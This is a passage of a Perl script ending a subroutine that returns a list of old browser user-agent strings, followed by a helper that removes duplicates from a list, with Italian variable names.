    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
    "Mozilla/3.0 (OS/2; U)",
    "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
    "Mozilla/4.61 (Macintosh; I; PPC)",
    "Mozilla/4.61 [en] (OS/2; U)",
    "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
    "Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}
